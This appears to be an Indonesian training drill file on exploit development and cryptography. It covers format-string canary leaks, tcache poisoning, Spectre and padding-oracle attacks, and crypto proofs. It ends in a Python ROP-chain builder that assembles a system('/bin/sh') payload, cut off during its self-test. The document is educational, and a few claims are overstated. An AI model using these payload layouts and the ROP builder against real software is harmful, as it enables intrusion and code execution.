# Socratic Diagnostic Drills: Tingkat 11 - Keamanan Siber, Kriptografi & Rekayasa Biner (Pwn)

**Berkas**: `tier-11-cybersecurity-pwn-drills.md`  
**Domain**: Eksploitasi Memori x86_64 (ROP, ASLR/Canary Bypass), Tcache Poisoning, Paradoks Ulang Tahun Hash & Penyusun ROP Chain  
**Tingkat Kurikulum**: [Tingkat 11: Cybersecurity, Kriptografi & Reverse Engineering](../curriculum/11-cybersecurity-reverse-engineering/README.md)  
**Deck Flashcards Terkait**: [`deck-08-cybersecurity-cryptography-pwn`](../flashcards/deck-08-cybersecurity-cryptography-pwn.md)

---

## 1. Domain Overview & Jebakan Model Mental (Mental Model Traps)

Rekayasa keamanan siber dan eksploitasi biner tingkat rendah (*Pwn*) adalah seni memahami mikroarsitektur dan semantik instruksi mesin secara literal, melampaui asumsi kompilator. Ketika pertahanan modern seperti ASLR, NX, dan Stack Canary aktif, penyerang dan peneliti keamanan beroperasi pada celah-celah logika deterministik.

### Jebakan Model Mental Kritis:
1. **Ilusi 'Stack Canary Menjamin Keamanan Stack'**: Mengira bahwa mengaktifkan proteksi `-fstack-protector-all` membuat program kebal terhadap pembajakan aliran kendali (*control flow hijacking*). Kerentanan *Format String* (`printf(user_input)`) atau kebocoran memori (*information leak*) memungkinkan penyerang membaca nilai cookie canary secara langsung, lalu memasukkannya kembali ke dalam payload buffer overflow tanpa memicu deteksi `__stack_chk_fail`.
2. **Kekeliruan 'ASLR Mengacak Seluruh Memori'**: Mengasumsikan bahwa Address Space Layout Randomization (ASLR) mengacak setiap fungsi atau instruksi secara independen. ASLR hanya mengacak **Base Address** dari setiap segmen memori (Binary ELF, Libc, Stack, Heap). *Offset* relatif antara instruksi di dalam pustaka Libc bersifat konstan 100%. Satu kebocoran alamat fungsi tunggal (misal `puts`) membongkar lokasi seluruh fungsi lain di Libc (seperti `system` dan `/bin/sh`).
3. **Miskonsepsi Eksekusi Spekulatif (Mitigasi Perangkat Lunak)**: Mengira bahwa pernyataan `if (index < size)` dalam kode bahasa C menjamin bahwa memori di luar batas array tidak akan pernah diakses oleh prosesor. Pada arsitektur dengan branch predictor agresif (Spectre Variant 1), CPU mengeksekusi percabangan secara spekulatif melampaui batas array, memuat data rahasia ke dalam L1/L2 data cache sebelum instruksi dibatalkan (*squashed*), meninggalkan jejak waktu yang dapat diekstraksi via serangan *Flush+Reload*.

---

## 2. Bagian 1: Interogasi Sokratik Model Mental (4 Soal Diagnostik)

### Soal 1.1: Anatomi Eksploitasi Format String dan Pembongkaran Canary x86_64
Diberikan cuplikan kode C yang rentan:
```c
void vulnerable_greeter() {
    char canary_leak_buf[64];
    read(0, canary_leak_buf, 64);
    printf(canary_leak_buf); // Uncontrolled format string!
    char overflow_buf[32];
    read(0, overflow_buf, 128); // Buffer overflow
}
```
Jelaskan bagaimana penyerang memanfaatkan penentu format `%p` dan *direct parameter access* (seperti `%$p`) untuk mengekstrak nilai Stack Canary dan alamat pengembalian (*saved return address*), serta bagaimana nilai tersebut disuntikkan ke dalam `overflow_buf` untuk membajak register RIP tanpa memicu crash.

<details>
<summary><b>🔍 Buka Solusi Sokratik & Analisis Mental Model</b></summary>

**Analisis Konvensi Pemanggilan System V AMD64 ABI & Stack Layout**:
1. **Konvensi Pemanggilan Fungsi pada x86_64**:
   Ketika `printf()` dipanggil, 6 argumen pertama diteruskan melalui register: `RDI` (format string), `RSI`, `RDX`, `RCX`, `R8`, `R9`. Argumen ke-7 dan seterusnya diletakkan di stack pengguna dari `$rsp` ke atas.
2. **Mekanisme Format String Arbitrary Read**:
   - Jika `printf` menerima format string dari input pengguna tanpa argumen tambahan, `printf` mengira argumen tetap ada.
   - Mengirimkan string `%p %p %p %p %p %p` mencetak isi register `RSI` hingga `R9`.
   - Menggunakan token akses parameter langsung `%{k}$p` memungkinkan pembacaan slot memori stack ke-$k$ secara presisi.
3. **Lokasi Stack Canary**:
   - Kompilator meletakkan nilai rahasia Canary tepat di atas *Saved Frame Pointer* (RBP) dan *Saved Return Address* (RIP).
   - Melalui eksperimen atau penelusuran GDB, penyerang mengidentifikasi indeks offset canary (misalnya `%11$p` atau `%15$p`).
   - Output hexadecimal yang berakhiran `00` (karena byte terendah stack canary x86_64 selalu berupa null-byte `\x00` untuk memutus eksploitasi fungsi string standar) membocorkan canary 8-byte secara utuh.
4. **Penyusunan Payload Buffer Overflow**:
   - Penyerang menyusun payload untuk `read(0, overflow_buf, 128)`:
     `[32 byte sampah] + [8 byte Canary Asli yang bocor] + [8 byte RBP sampah] + [8 byte Alamat Target / ROP Gadget]`
   - Saat fungsi `vulnerable_greeter()` selesai, instruksi epilog kompilator membandingkan canary di stack dengan register FS segment (`xor rax, QWORD PTR fs:0x28`). Karena nilainya cocok 100%, tidak ada peringatan yang dipicu.
   - Instruksi `ret` mengeksekusi alamat target penyerang!
</details>

---

### Soal 1.2: Glitch Alokasi Heap Glibc: Tcache Poisoning & Arbitrary Write
Dalam pustaka standar glibc (sejak versi 2.26), mekanisme alokasi *Thread Local Caching* (tcache) diperkenalkan untuk mempercepat alokasi memori berukuran kecil.
Jelaskan bagaimana kerentanan *Double Free* atau *Use-After-Free* pada tcache bin memungkinkan penyerang menimpa pointer `next` (`fd`) chunk memori yang bebas, sehingga pemanggilan `malloc()` berikutnya mengembalikan alamat sembarang di ruang memori (seperti `__free_hook` atau tabel GOT) untuk mengeksekusi shellcode.

<details>
<summary><b>🔍 Buka Solusi Sokratik & Analisis Mental Model</b></summary>

**Analisis Struktur Data Heap Alokator Glibc**:
1. **Struktur Tcache Bin**:
   - Tcache adalah singly linked-list LIFO (Last-In First-Out) per-thread yang menampung hingga 7 chunk memori berukuran sama.
   - Setiap chunk yang dibebaskan (`free(p)`) menyimpan pointer ke chunk berikutnya pada 8 byte pertama dari area data pengguna (`chunk->fd = next_chunk`).
2. **Mekanisme Eksploitasi Tcache Poisoning**:
   - Misalkan program memiliki kerentanan yang mengizinkan pembebasan chunk $A$ dua kali (*double free*) atau memodifikasi chunk $A$ setelah dibebaskan (*Use-After-Free*).
   - Penyerang memanggil `free(A)`. Chunk $A$ masuk ke tcache list: `Head -> A -> NULL`.
   - Melalui UAF, penyerang menulis alamat target sembarang ke dalam payload $A$ (misal alamat pointer fungsi `__free_hook`):
     `*(uint64_t*)A = (uint64_t)&__free_hook;`
   - Kini, linked list tcache terkorupsi menjadi: `Head -> A -> &__free_hook`.
3. **Pemanenan Alokasi Sembarang (*Arbitrary Write*)**:
   - Penyerang memanggil `malloc()` pertama: Alokator mengembalikan chunk $A$. Kepala linked list bergeser ke elemen berikutnya: `Head -> &__free_hook`.
   - Penyerang memanggil `malloc()` kedua: Alokator mengembalikan pointer yang menunjuk langsung ke memori `__free_hook`!
   - Penyerang menulis alamat fungsi `system` ke dalam memori yang dikembalikan tersebut.
   - Ketika program kemudian memanggil `free(ptr_containing_bin_sh)`, alokator memeriksa apakah `__free_hook` terisi. Karena terisi alamat `system`, program mengeksekusi `system("/bin/sh")` dan memberikan akses root ke penyerang.
</details>

---

### Soal 1.3: Serangan Saluran Samping Waktu Spekulatif (Spectre Variant 1 - CVE-2017-5753)
Diberikan cuplikan instruksi mikroprosesor:
```c
if (x < array1_size) {
    y = array2[array1[x] * 512];
}
```
Jika `x` bernilai jauh melampaui batas `array1_size` dan menunjuk ke kunci privat kernel di memori, jelaskan bagaimana eksekusi spekulatif perangkat keras memuat data rahasia ke dalam cache L1 data CPU. Bagaimana teknik serangan *Flush + Reload* membaca nilai byte rahasia tersebut dengan mengukur siklus instruksi `rdtsc`?

<details>
<summary><b>🔍 Buka Solusi Sokratik & Analisis Mental Model</b></summary>

**Analisis Mikroarsitektur Spekulatif & Cache Side-Channel**:
1. **Prediksi Percabangan (*Branch Prediction*) & Eksekusi *Out-of-Order***:
   - Nilai `array1_size` sengaja dihapus dari cache CPU oleh penyerang menggunakan instruksi `clflush`.
   - Ketika CPU mengevaluasi `if (x < array1_size)`, CPU terpaksa menunggu ratusan siklus clock untuk mengambil nilai `array1_size` dari RAM fisik.
   - Agar tidak menganggur (*pipeline stall*), *Branch Predictor* CPU memprediksi bahwa kondisi percabangan bernilai TRUE (karena sebelumnya telah dilatih berkali-kali dengan input legal).
2. **Akses Memori Spekulatif Melampaui Batas**:
   - CPU mengeksekusi badan `if` secara spekulatif:
     1. Membaca byte rahasia: $k = \text{array1}[x]$ (di mana $x$ adalah offset ke memori rahasia kernel).
     2. Menghitung alamat: $k \times 512$.
     3. Mengakses $\text{array2}[k \times 512]$, yang menyebabkan baris cache (*cache line*) terkait nilai $k$ dimuat dari RAM ke L1 Data Cache fisik CPU.
3. **Pembatalan Eksekusi Spekulatif (*Squash*)**:
   - Nilai `array1_size` akhirnya tiba dari RAM. CPU menyadari bahwa $x \ge \text{array1\_size}$.
   - CPU membatalkan seluruh perubahan register arsitektural (*rollback pipeline*). Nilai variabel $y$ dihapus seolah-olah percabangan tidak pernah dieksekusi.
   - **Celah Fatal Perangkat Keras**: Perubahan status fisik pada L1/L2 Cache **TIDAK DIBATALKAN**! Cache line untuk $\text{array2}[k \times 512]$ tetap bersarang di L1 Cache.
4. **Ekstraksi Data Rahasia via Flush + Reload**:
   - Penyerang mengulang pembacaan untuk seluruh kemungkinan nilai byte $i \in [0, 255]$:
     Ukur waktu pembacaan $\text{array2}[i \times 512]$ menggunakan register pencacah waktu presisi tinggi `rdtsc`:
     - Untuk $i \ne k$: Akses memori lambat (Cache Miss, butuh ~200 siklus clock dari RAM).
     - Untuk $i = k$: Akses memori sangat cepat (Cache Hit, hanya butuh ~10-20 siklus clock dari L1 Cache).
   - Nilai $i$ yang menghasilkan durasi waktu terpendek adalah nilai eksak dari byte rahasia $k$!
</details>

---

### Soal 1.4: Serangan Padding Oracle pada Mode Operasi CBC (Cipher Block Chaining)
Dalam enkripsi simetris AES-CBC dengan skema PKCS#7 padding, jelaskan bagaimana sebuah server web yang membocorkan respons error berbeda antara *invalid padding error* dan *decryption error* (atau perbedaan latensi waktu) memungkinkan penyerang mendekripsi ciphertext secara utuh tanpa mengetahui kunci enkripsi sama sekali.

<details>
<summary><b>🔍 Buka Solusi Sokratik & Analisis Mental Model</b></summary>

**Analisis Keamanan Kriptografi Blok Simetris**:
1. **Mekanisme Dekripsi AES-CBC**:
   Dalam mode CBC, blok plaintext $P_i$ diperoleh melalui dekripsi blok ciphertext $C_i$ dengan kunci $K$, lalu di-XOR dengan blok ciphertext sebelumnya $C_{i-1}$:
   $$P_i = D_K(C_i) \oplus C_{i-1} \implies D_K(C_i) = P_i \oplus C_{i-1}$$
2. **Aturan Padding PKCS#7**:
   Jika blok berukuran 16 byte memerlukan $k$ byte padding di akhir, maka $k$ byte terakhir harus bernilai byte $k$.
   Contoh: 1 byte padding adalah `\x01`, 2 byte padding adalah `\x02 \x02`, dst.
3. **Eksploitasi Oracle Byte Terakhir**:
   - Penyerang ingin mendekripsi blok ciphertext $C_2$. Penyerang memodifikasi blok sebelumnya $C_1$ menjadi $C_1'$.
   - Penyerang mengirimkan pasangan $(C_1', C_2)$ ke server.
   - Server mendekripsi: $P_2' = D_K(C_2) \oplus C_1'$.
   - Penyerang mencoba memanipulasi byte terakhir $C_1'[15]$ dari nilai `0x00` hingga `0xFF` (maksimal 256 percobaan) sampai server **TIDAK mengembalikan error padding**.
   - Ketika server menerima padding, byte terakhir $P_2'[15]$ pasti bernilai `\x01`!
4. **Rekonstruksi Plaintext Asli**:
   $$P_2'[15] = D_K(C_2)[15] \oplus C_1'[15] = \text{0x01}$$
   $$\implies D_K(C_2)[15] = \text{0x01} \oplus C_1'[15]$$
   Karena kita sekarang mengetahui $D_K(C_2)[15]$, kita dapat menghitung plaintext asli tanpa mengetahui kunci $K$:
   $$P_2[15] = D_K(C_2)[15] \oplus C_1[15]$$
   Dengan mengulang proses ini secara mundur dari byte 15 ke byte 0, penyerang dapat mendekripsi seluruh ciphertext hanya dengan $256 \times 16 = 4096$ kueri per blok 16-byte.
</details>

---

## 3. Bagian 2: Penurunan Matematis Formal (3 Soal Derivasi)

### Soal 2.1: Paradoks Ulang Tahun (*Birthday Paradox*) dan Batas Tumbukan Hash Kriptografis
Diberikan fungsi hash kriptografis yang menghasilkan digest berukuran $b$ bit, sehingga ruang output memiliki $N = 2^b$ kemungkinan nilai.
1. Untuk $k$ nilai input sembarang yang di-hash, turunkan probabilitas $P_{\text{unique}}(k)$ bahwa TIDAK ADA satupun pasangan input yang menghasilkan nilai digest yang sama.
2. Gunakan aproksimasi $1 - x \approx e^{-x}$ untuk menurunkan rumus probabilitas terjadinya minimal satu tumbukan (*collision probability*):
   $$P_{\text{collision}}(k) \approx 1 - e^{-\frac{k^2}{2N}}$$
3. Buktikan bahwa jumlah sampel $k$ yang dibutuhkan agar probabilitas tumbukan mencapai minimal $50\%$ ($P \ge 0{,}5$) adalah:
   $$k \approx \sqrt{2 \ln 2} \times 2^{b/2} \approx 1{,}1774 \times 2^{b/2}$$
dan simpulkan mengapa fungsi hash dengan output 128-bit (seperti MD5) hanya memiliki kekuatan keamanan efektif sebesar $2^{64}$ operasi.

<details>
<summary><b>📐 Buka Penurunan Matematis Lengkap & Pembuktian</b></summary>

**Langkah 1: Perhitungan Probabilitas Ketiadaan Tumbukan**:
Misalkan $k$ input independen di-hash ke dalam $N$ kemungkinan output seragam.
- Elemen ke-1 dapat menempati sembarang nilai: $\frac{N}{N}$.
- Elemen ke-2 tidak boleh sama dengan elemen ke-1: $\frac{N-1}{N} = 1 - \frac{1}{N}$.
- Elemen ke-3 tidak boleh sama dengan dua elemen pertama: $\frac{N-2}{N} = 1 - \frac{2}{N}$.
- Elemen ke-$k$ tidak boleh sama dengan $k-1$ elemen sebelumnya: $\frac{N-(k-1)}{N} = 1 - \frac{k-1}{N}$.

Probabilitas bahwa seluruh $k$ elemen memiliki hash unik:
$$P_{\text{unique}}(k) = \prod_{i=1}^{k-1} \left(1 - \frac{i}{N}\right)$$

**Langkah 2: Aproksimasi Eksponensial**:
Gunakan ekspansi deret Taylor $e^{-x} = 1 - x + \frac{x^2}{2!} - \dots \approx 1 - x$ untuk $x = \frac{i}{N} \ll 1$:
$$1 - \frac{i}{N} \approx e^{-\frac{i}{N}}$$
Substitusikan ke dalam perkalian:
$$P_{\text{unique}}(k) \approx \prod_{i=1}^{k-1} e^{-\frac{i}{N}} = \exp\left(-\sum_{i=1}^{k-1} \frac{i}{N}\right) = \exp\left(-\frac{1}{N} \sum_{i=1}^{k-1} i\right)$$
Gunakan rumus jumlah deret aritmetika $\sum_{i=1}^{k-1} i = \frac{(k-1)k}{2} \approx \frac{k^2}{2}$:
$$P_{\text{unique}}(k) \approx \exp\left(-\frac{k^2}{2N}\right)$$
Maka probabilitas terjadinya minimal satu tumbukan (*collision*):
$$P_{\text{collision}}(k) = 1 - P_{\text{unique}}(k) \approx 1 - e^{-\frac{k^2}{2N}}$$

**Langkah 3: Menentukan Ambang Batas 50% Tumbukan**:
Tetapkan $P_{\text{collision}}(k) = 0{,}5$:
$$1 - e^{-\frac{k^2}{2N}} = 0{,}5 \implies e^{-\frac{k^2}{2N}} = 0{,}5$$
Ambil logaritma natural pada kedua sisi:
$$-\frac{k^2}{2N} = \ln(0{,}5) = -\ln 2 \implies \frac{k^2}{2N} = \ln 2$$
$$k^2 = 2N \ln 2 \implies k = \sqrt{2 \ln 2} \times \sqrt{N}$$
Hitung konstanta numerik:
$$\sqrt{2 \ln 2} = \sqrt{2 \times 0{,}693147} = \sqrt{1{,}386294} \approx 1{,}17741$$
Karena ruang hash berukuran $b$ bit ($N = 2^b \implies \sqrt{N} = 2^{b/2}$):
$$k \approx 1{,}1774 \times 2^{b/2}$$

**Langkah 4: Implikasi Terhadap Kekuatan Algoritma Kriptografi**:
- Untuk hash 128-bit ($b = 128$): Serangan Preimage (mencari input untuk hash tertentu) memerlukan $2^{128}$ operasi. Namun, serangan Tumbukan (*Birthday Attack* mencari sembarang dua dokumen yang menghasilkan hash identik) hanya membutuhkan:
  $$k \approx 1{,}177 \times 2^{64} \approx 2{,}17 \times 10^{19} \text{ operasi}$$
  Beban komputasi ini dapat ditembus oleh cluster kartu grafis (GPU) modern dalam hitungan jam.
- Oleh karena itu, standar keamanan industri saat ini mewajibkan panjang digest minimal **256 bit** (SHA-256) agar kekuatan terhadap tumbukan adalah $2^{128}$, yang berada di luar jangkauan komputasi fisik alam semesta.
</details>

---

### Soal 2.2: Bukti Kebenaran Sistem Kriptografi Kunci Asimetris RSA
Dalam kriptografi RSA, dipilih dua bilangan prima besar $p$ dan $q$.
Modulus $n = pq$, dan fungsi totien Euler $\phi(n) = (p-1)(q-1)$.
Kunci publik $e$ dipilih sedemikian hingga $\gcd(e, \phi(n)) = 1$.
Kunci privat $d$ dihitung melalui invers modular: $e \cdot d \equiv 1 \pmod{\phi(n)}$.
Proses enkripsi pesan $m \in [0, n-1]$ adalah $c \equiv m^e \pmod n$, dan dekripsi adalah $m' \equiv c^d \pmod n$.
Buktikan secara matematis bahwa $m' \equiv m \pmod n$ untuk SELURUH nilai $m$, termasuk kasus di mana pesan $m$ bukan bilangan prima relatif terhadap $n$ ($\gcd(m, n) > 1$).

<details>
<summary><b>📐 Buka Penurunan Matematis Lengkap & Pembuktian</b></summary>

**Langkah 1: Hubungan Eksponen Enkripsi dan Dekripsi**:
Berdasarkan konstruksi kunci privat $d$:
$$e \cdot d \equiv 1 \pmod{\phi(n)} \implies ed = 1 + k \cdot \phi(n) = 1 + k(p-1)(q-1) \quad \text{untuk suatu integer } k$$
Maka proses dekripsi mengevaluasi:
$$m' \equiv c^d \equiv (m^e)^d \equiv m^{ed} \equiv m^{1 + k(p-1)(q-1)} \pmod n$$
Kita harus membuktikan bahwa $m^{1 + k(p-1)(q-1)} \equiv m \pmod n$.
Karena $n = pq$ di mana $p$ dan $q$ adalah bilangan prima berbeda, berdasarkan **Chinese Remainder Theorem (CRT)**, kongruensi modulo $n$ terpenuhi jika dan hanya jika kongruensi tersebut terpenuhi modulo $p$ dan modulo $q$ secara serentak:
$$m^{ed} \equiv m \pmod p \quad \text{dan} \quad m^{ed} \equiv m \pmod q$$

**Langkah 2: Evaluasi Kongruensi Modulo $p$**:
Terdapat dua kemungkinan nilai $m$ terhadap $p$:
- **Kasus A: $m$ adalah kelipatan $p$ ($m \equiv 0 \pmod p$)**:
  $$m^{ed} \equiv 0^{ed} \equiv 0 \equiv m \pmod p$$
  Kongruensi terbukti secara trivial.
- **Kasus B: $m$ bukan kelipatan $p$ ($\gcd(m, p) = 1$)**:
  Berdasarkan **Teorema Kecil Fermat** (*Fermat's Little Theorem*):
  $$m^{p-1} \equiv 1 \pmod p$$
  Evaluasi $m^{ed}$:
  $$m^{ed} = m^{1 + k(p-1)(q-1)} = m \cdot \left(m^{p-1}\right)^{k(q-1)} \equiv m \cdot (1)^{k(q-1)} \equiv m \cdot 1 \equiv m \pmod p$$

Dengan demikian, untuk seluruh kemungkinan nilai $m$, terbukti bahwa:
$$m^{ed} \equiv m \pmod p$$

**Langkah 3: Evaluasi Kongruensi Modulo $q$**:
Dengan penalaran yang identik secara simetris:
- Jika $m \equiv 0 \pmod q$, maka $m^{ed} \equiv 0 \equiv m \pmod q$.
- Jika $\gcd(m, q) = 1$, berdasarkan Teorema Kecil Fermat: $m^{q-1} \equiv 1 \pmod q$.
  $$m^{ed} = m \cdot \left(m^{q-1}\right)^{k(p-1)} \equiv m \cdot (1)^{k(p-1)} \equiv m \pmod q$$

Dengan demikian, untuk seluruh nilai $m$, terbukti bahwa:
$$m^{ed} \equiv m \pmod q$$

**Langkah 4: Penggabungan Melalui Teorema Sisa Tionghoa (CRT)**:
Karena $p$ dan $q$ adalah bilangan prima koprima ($\gcd(p, q) = 1$):
$$p \mid (m^{ed} - m) \quad \text{dan} \quad q \mid (m^{ed} - m) \implies pq \mid (m^{ed} - m)$$
Karena $n = pq$:
$$m^{ed} - m \equiv 0 \pmod n \implies m^{ed} \equiv m \pmod n$$
Terbukti secara mutlak bahwa dekripsi RSA selalu mengembalikan pesan asli $m$ secara sempurna.
</details>

---

### Soal 2.3: Pertukaran Kunci Diffie-Hellman dan Kekerasan Masalah Logaritma Diskrit
Dalam protokol Diffie-Hellman melalui grup siklis $\mathbb{Z}_p^*$ dengan generator $g$ dan modulus prima besar $p$:
1. Tunjukkan bagaimana Alice (dengan kunci rahasia $a$) dan Bob (dengan kunci rahasia $b$) membentuk kunci rahasia bersama $K_{AB} = g^{ab} \pmod p$ melalui kanal publik yang tidak aman.
2. Jelaskan mengapa penyadap pasif Eve yang menyadap $A = g^a \pmod p$ dan $B = g^b \pmod p$ tidak dapat menghitung $K_{AB}$ secara efisien (Computational Diffie-Hellman Assumption).
3. Turunkan batas kompleksitas algoritma **Baby-step Giant-step** Shanks dalam menyelesaikan Logaritma Diskrit dalam waktu $\mathcal{O}(\sqrt{p})$ langkah dan memori $\mathcal{O}(\sqrt{p})$.

<details>
<summary><b>📐 Buka Penurunan Matematis Lengkap & Pembuktian</b></summary>

**Langkah 1: Protokol Pertukaran Diffie-Hellman**:
1. Parameter publik disepakati: Bilangan prima besar $p$ dan generator $g \in \mathbb{Z}_p^*$.
2. Alice memilih bilangan bulat rahasia acak $a \in [2, p-2]$, menghitung kunci publik $A = g^a \pmod p$, dan mengirim $A$ ke Bob.
3. Bob memilih bilangan bulat rahasia acak $b \in [2, p-2]$, menghitung kunci publik $B = g^b \pmod p$, dan mengirim $B$ ke Alice.
4. Alice menghitung:
   $$K_A = B^a \pmod p = (g^b)^a \pmod p = g^{ba} = g^{ab} \pmod p$$
5. Bob menghitung:
   $$K_B = A^b \pmod p = (g^a)^b \pmod p = g^{ab} \pmod p$$
Karena perkalian bilangan bulat bersifat komutatif ($ab = ba$), $K_A = K_B = K_{AB}$. Keduanya kini memiliki kunci simetris identik tanpa pernah mengirimkan nilai $a$ atau $b$ ke jaringan.

**Langkah 2: Asumsi Masalah Logaritma Diskrit (DLP)**:
Penyadap Eve mengetahui $(p, g, A, B)$. Untuk menghitung $g^{ab} \pmod p$, Eve dihadapkan pada **Computational Diffie-Hellman (CDH) Problem**. Pendekatan langsung mengharuskan penyelesaian Masalah Logaritma Diskrit (*Discrete Logarithm Problem* - DLP):
$$A \equiv g^a \pmod p \implies a = \log_g(A) \pmod p$$
Tidak ada algoritma waktu polinomial klasik yang diketahui untuk menyelesaikan DLP di atas grup bilangan bulat modulo prima sembarang.

**Langkah 3: Analisis Kompleksitas Baby-Step Giant-Step Shanks**:
Misalkan kita ingin mencari $x$ pada $g^x \equiv h \pmod p$, di mana $x < p$.
Tetapkan $m = \lceil \sqrt{p} \rceil$. Maka $x$ dapat dituliskan secara unik sebagai:
$$x = i \cdot m + j \quad \text{di mana } 0 \le j < m \text{ dan } 0 \le i < m$$
Substitusikan ke persamaan:
$$g^{im + j} \equiv h \pmod p \implies g^j \equiv h \cdot (g^{-m})^i \pmod p$$

**Langkah Algoritma**:
1. **Baby-steps**: Hitung $g^j \pmod p$ untuk seluruh $j \in [0, m-1]$. Simpan pasangan $(g^j, j)$ ke dalam hash table.
   - Komputasi: $m$ eksponensiasi modular $\implies \mathcal{O}(\sqrt{p})$.
   - Memori: $m$ entri hash table $\implies \mathcal{O}(\sqrt{p})$.
2. **Giant-steps**: Hitung faktor pengali $g^{-m} \equiv (g^m)^{-1} \pmod p$.
   Untuk $i = 0, 1, \dots, m-1$:
   - Hitung nilai $\gamma = h \cdot (g^{-m})^i \pmod p$.
   - Periksa apakah $\gamma$ ada di dalam hash table hasil baby-step.
   - Jika ditemukan kecocokan $\gamma = g^j$:
     Maka solusi logaritma diskrit adalah $x = i \cdot m + j$.

**Kompleksitas Total**:
Waktu komputasi total adalah $2m = 2 \lceil \sqrt{p} \rceil = \mathcal{O}(\sqrt{p})$ operasi perkalian modular, dan ruang memori adalah $\mathcal{O}(\sqrt{p})$.
Untuk bilangan prima 2048-bit ($p \approx 2^{2048}$):
$\sqrt{p} = 2^{1024}$ operasi, yang mustahil dihitung oleh komputer mana pun hingga akhir masa alam semesta.
</details>

---

## 4. Bagian 3: Tantangan Pemrograman Komputasional (Live Coding Challenge)

### Tantangan Implementasi: Penyusun ROP Chain & Penjajar Stack ABI System V AMD64
Implementasikan penyusun rantai *Return-Oriented Programming* (ROP Chain Builder) yang secara otomatis menghitung alamat dasar Libc (*Libc Base Address*) dari kebocoran memori (*info leak*), menyusun gadget register argumen System V AMD64 (`pop rdi; ret`, `pop rsi; ret`, `pop rdx; ret`), dan memastikan penjajaran stack 16-byte (*16-byte Stack Alignment*) sebelum memanggil fungsi `system()`.

#### Spesifikasi Fungsional:
1. **Resolusi Libc Base**: Menghitung `libc_base = leaked_symbol_address - symbol_offset_in_libc`.
2. **Pencarian & Penataan Gadget**: Mengonfigurasi register argumen $RDI$ (argumen pertama) untuk menunjuk ke string `"/bin/sh"`.
3. **Penjajaran Stack ABI AMD64 (16-Byte Alignment Trap)**:
   Instruksi `movaps` di dalam fungsi `system()` / `do_system()` glibc menuntut bahwa `$rsp` harus merupakan kelipatan 16 byte saat instruksi `call` dieksekusi. Kegagalan mensejajarkan stack menyebabkan sinyal *Segmentation Fault (SIGSEGV)*. Builder harus secara otomatis menyisipkan gadget dummy `ret` jika posisi stack tidak sejajar kelipatan 16.
4. **Verifikasi Assert Payload**: Menguji keselarasan byte, offset canary, dan struktur serialisasi biner payload.

<details>
<summary><b>💻 Buka Solusi Arsitektur & Kode Produksi Standar Industri</b></summary>

```python
import struct
from dataclasses import dataclass

@dataclass
class ROPGadgets:
    pop_rdi_ret: int   # Offset pop rdi; ret
    pop_rsi_ret: int   # Offset pop rsi; ret
    pop_rdx_ret: int   # Offset pop rdx; ret
    ret: int           # Offset ret (digunakan untuk stack alignment pad)
    system: int        # Offset system()
    bin_sh: int        # Offset "/bin/sh" string

class ROPPayloadBuilder:
    """
    Penyusun Eksploitasi ROP Chain x86_64 dengan Penegakan Penjajaran Stack 16-Byte ABI.
    """
    def __init__(self, libc_base: int, gadgets: ROPGadgets):
        self.libc_base = libc_base
        self.gadgets = gadgets
        self.chain: list[int] = []

    @classmethod
    def from_leak(cls, leaked_func_addr: int, func_offset: int, gadgets: ROPGadgets) -> "ROPPayloadBuilder":
        """Menghitung alamat dasar libc dari kebocoran alamat memori fungsi."""
        libc_base = leaked_func_addr - func_offset
        if libc_base & 0xFFF != 0:
            raise ValueError(f"Libc Base tidak sejajar halaman (Page-aligned 4KB)! Base: {hex(libc_base)}")
        return cls(libc_base, gadgets)

    def _resolve(self, offset: int) -> int:
        return self.libc_base + offset

    def add_raw(self, value: int):
        """Menambahkan nilai 64-bit langsung ke dalam ROP chain."""
        self.chain.append(value)

    def set_rdi(self, val: int):
        """Memuat nilai val ke dalam register RDI (argumen 1)."""
        self.chain.append(self._resolve(self.gadgets.pop_rdi_ret))
        self.chain.append(val)

    def set_rsi(self, val: int):
        """Memuat nilai val ke dalam register RSI (argumen 2)."""
        self.chain.append(self._resolve(self.gadgets.pop_rsi_ret))
        self.chain.append(val)

    def build_execve_system(self, current_stack_depth_entries: int = 0) -> bytes:
        """
        Menyusun ROP chain untuk memanggil system("/bin/sh").
        Memastikan penjajaran stack 16-byte sebelum memanggil system().
        current_stack_depth_entries: Jumlah entri 8-byte yang telah berada di stack
        sebelum ROP chain ini (misal buffer padding + canary + saved RBP).
        """
        bin_sh_addr = self._resolve(self.gadgets.bin_sh)
        system_addr = self._resolve(self.gadgets.system)
        ret_gadget = self._resolve(self.gadgets.ret)

        # ROP chain target: [pop_rdi, bin_sh_addr, system_addr] = 3 entri
        # Total kedalaman stack saat 'system' dieksekusi:
        # Kedalaman = (current_depth + len(chain) + entries_to_add)
        tentative_entries = len(self.chain) + 3 # pop_rdi + bin_sh + system
        total_depth = current_stack_depth_entries + tentative_entries

        # ABI x86_64: Saat instruksi CALL system dijalankan, RSP harus 16-byte aligned.
        # Jika total slot stack bernilai ganjil (tidak genap kelipatan 2),
        # sisipkan 1 instruksi 'ret' dummy sebagai bantalan (alignment padding).
        if total_depth % 2 != 0:
            self.chain.append(ret_gadget)

        # Muat argumen pertama (RDI = &"/bin/sh")
        self.set_rdi(bin_sh_addr)
        # Panggil system()
        self.chain.append(system_addr)

        # Serialisasi seluruh rantai ke dalam format byte biner little-endian 64-bit
        payload = b"".join(struct.pack("<Q", entry) for entry in self.chain)
        return payload


# =====================================================================
# Unit Test & Verifikasi Pengujian ROP Chain Builder
# =====================================================================
if __name__ == "__main__":
    print("Memulai verifikasi mandiri ROP Payload Builder...")

    # Offset simbolik tipikal dari pustaka GNU libc 2.31 x86_64
    PUTS_OFFSET = 0x875a0
    gadget_db = ROPGadgets(
        pop_rdi_ret=0x26b72,
        pop_rsi_ret=0x27529,
        pop_rdx_ret=0x11c371,
        ret=0x25679,
        system=0x55410,
        bin_sh=0x1b75aa
    )

    # 1. Simulasi Kebocoran Memori (Info Leak)
    # Misalkan penyerang berhasil membocorkan alamat fungsi 'puts' via format string
    simulated_libc_base = 0x7fff80000000
    leaked_puts_address = simulated_libc_base + PUTS_OFFSET

    builder = ROPPayloadBuilder.from_leak(
        leaked_func_addr=leaked_puts_address,
        func_offset=PUTS_OFFSET,
        gadgets=gadget_db
    )
    print(f"Libc Base berhasil direkonstruksi: {hex(builder.libc_base)}")
    assert builder.libc_base == simulated_libc_base, "Kalkulasi Libc Base melenceng!"

    # 2. Uji Penjajaran Stack 16-Byte
    # Misalkan payload diinjeksikan setelah:
    # 64 byte buffer + 8 byte canary + 8 byte saved RBP = 80 byte = 10 entri qword (genap)
    stack_entries_before_rop = 10
    payload_bytes = builder.build_execve_system(current_stack_depth_entries=stack_entries_before_rop)

    total_qwords = stack_entries_before_rop + (len(payload_bytes) // 8)
